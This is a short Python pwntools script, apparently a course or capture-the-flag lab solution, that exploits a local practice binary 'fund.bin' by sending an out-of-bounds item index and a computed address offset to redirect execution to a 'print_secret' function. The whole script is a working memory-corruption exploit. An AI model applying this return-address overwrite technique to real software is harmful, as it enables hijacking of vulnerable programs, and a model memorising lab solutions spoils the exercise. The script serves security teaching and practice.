#!/usr/bin/python3

from pwn import *


def exploit():
    print_secret_addr=0x4008f6   
    original_return_addr=0x400d15   
    offset=original_return_addr-print_secret_addr 
 
   # Write your exploit logic here.
    p = process("./fund.bin")
    p.recvuntil(b"(Enter 1~3): ")
    p.sendline(b"2")

    
    p.recvuntil(b"Input the ID of item you want to withdraw money from: ")
    p.sendline(b"22")  #overflow index 
    p.recvuntil(b"Input the ID of item you want to invest more money: ")
    p.sendline(b"1")  #
    p.recvuntil(b"Decide how much to move: ")
    #p.sendline( b"\xf6\x08\x40")  #address of print_secret
    p.sendline(str(offset))
   
    
    p.recvuntil(b"(Enter 1~3): ")
    p.sendline(b"3")
    print(p.recvall())

if __name__ == "__main__":
    exploit()
